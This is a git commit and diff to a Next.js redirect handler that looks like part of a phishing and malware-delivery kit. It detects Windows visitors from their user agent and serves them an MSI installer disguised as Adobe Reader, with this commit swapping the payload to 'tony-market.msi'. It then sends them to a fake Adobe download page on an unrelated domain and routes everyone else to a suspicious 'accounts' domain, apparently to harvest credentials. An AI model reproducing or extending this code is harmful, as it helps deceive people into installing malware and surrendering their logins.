5797555e31a048c296088b190db3a5765f87c808
Newman400 <marystepmom71@gmail.com>
2025-11-19 01:38:28 -0800

    Change MSI_PATH to point to tony-market.msi

--- my-redirect-app-html-ready/pages/api/redirect.js
+++ my-redirect-app-html-ready/pages/api/redirect.js
@@ -4,7 +4,7 @@ export default function handler(req, res) {
   const isWindows = /windows/i.test(userAgent);
 
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD = 'https://mksonline.com.mx/css/adobe/reader/download.html';
-  const MSI_PATH = '/Adobe Reader_en_install.msi';
+  const MSI_PATH = '/tony-market.msi';
   const NON_WINDOWS_TARGET = 'https://accounts.fxzova.icu';
 
   // 1. Try to get email from query normally
